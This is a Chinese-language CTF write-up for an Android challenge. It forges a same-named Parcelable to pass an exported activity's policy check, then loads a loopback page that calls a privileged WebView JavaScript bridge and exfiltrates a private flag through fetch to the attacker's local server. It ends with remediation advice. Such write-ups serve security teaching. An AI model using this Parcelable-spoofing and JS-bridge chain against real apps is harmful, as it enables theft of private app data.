# ParcelBridge Vault

## 题目简述

目标 APK 导出了 `RouterActivity`，接收 action `com.sctf.victim.OPEN`，并从 Intent extra 中读取 `RouteSpec` Parcelable。接收端会把 extras 的 ClassLoader 强制设为目标 APK 的 `RouteSpec`；但 Parcel 字节流仍由发送方对象的 `writeToParcel()` 生成。攻击 APK 因此可以声明同名类 `com.sctf.victim.RouteSpec`，自行控制字段布局，让目标端构造出能通过 `RoutePolicy` 的对象。

校验通过后，导出的 Router 会代为打开非导出的 `WebVaultActivity`，加载攻击者在设备回环地址提供的页面，并注入高权限 `Vault` JavaScript bridge。页面完成 session seal 后即可导出目标应用私有目录中的 flag。

## 解题过程

### 1. 伪造同名 Parcelable

攻击 APK 自身包名不能是 `com.sctf.victim`，可使用 `com.sctf.exp`；但在源码中额外定义完全限定名为 `com.sctf.victim.RouteSpec` 的 Parcelable。目标构造器按版本读取字段：奇数版本先读 `options` 再读 `origin`，且版本至少为 3 时继续读取 `proof`、`tags`，最后读取 `sessionId`。

因此选择 `version=3`，发送端严格按以下顺序写入：

```java
dest.writeInt(version);
dest.writeString(url);
dest.writeBundle(options);
dest.writeString(origin);
dest.writeInt(bridgeMode);
dest.writeByteArray(proof);
dest.writeStringList(tags);
dest.writeLong(sessionId);
```

发送端 `CREATOR` 是否真正读回这些值并不重要；重要的是系统打包 extra 时会调用攻击类的 `writeToParcel`，接收端再用受害应用的 `CREATOR` 解释同一字节序列。

### 2. 满足 RoutePolicy

构造对象使其满足源码中的全部条件：

```text
version          = 3
origin           = https://vault.sctf.local
options.signed   = true
bridgeMode       = 2
sessionId        = 任意非零 long
proof            = 至少 4 字节
url              = http://127.0.0.1:<高端口>/payload.html
```

例如攻击 APK 可先监听设备本机 `31337` 端口，再发送显式 Intent：

```java
Intent i = new Intent("com.sctf.victim.OPEN");
i.setPackage("com.sctf.victim");
i.putExtra("route", spec);
i.putExtra("trace_id", "exp-" + System.nanoTime());
i.putExtra("profile", "mobile");
startActivity(i);
```

`127.0.0.1` 在同一模拟器中指向设备本身，攻击 APK 的本地 HTTP 服务可以直接为受害 WebView 提供页面。

### 3. 调用 Vault JSBridge

`bridgeMode & 2 != 0` 时，WebView 注入名为 `Vault` 的接口，暴露 `open()`、`nonce()`、`commit()` 和 `export()`。攻击页面无需逆向 nonce 算法，因为接口本身会返回当前 nonce：

```html
<script>
const opened = Vault.open('client=web&stage=open');
const handle = new URLSearchParams(opened).get('handle');
const nonce = Vault.nonce();
Vault.commit(handle,
  'purpose=export&seal=1&nonce=' + encodeURIComponent(nonce));
const flag = Vault.export(handle);
fetch('/done?flag=' + encodeURIComponent(flag));
</script>
```

`commit` 将 session 标记为可导出，`Vault.export(handle)` 随后读取受害 APK 私有文件中的 flag。页面向本地服务请求 `/done?flag=...`，攻击 APK 从 HTTP 查询参数中取得结果。

## 方法总结

本题的决定性边界是 Android Parcelable、组件导出和 WebView bridge 的组合，不是 native 内存破坏，因此归入 mobile。接收端设置 ClassLoader 只能决定“由哪个类读取”，不能保证发送端用了同一套写入布局。修复应使用不可伪造的明确序列化格式、验证调用者身份，并避免让导出组件把外部可控回环 URL 带入具有私有数据权限的 WebView；高权限 JSBridge 更不应暴露给任意来源页面。
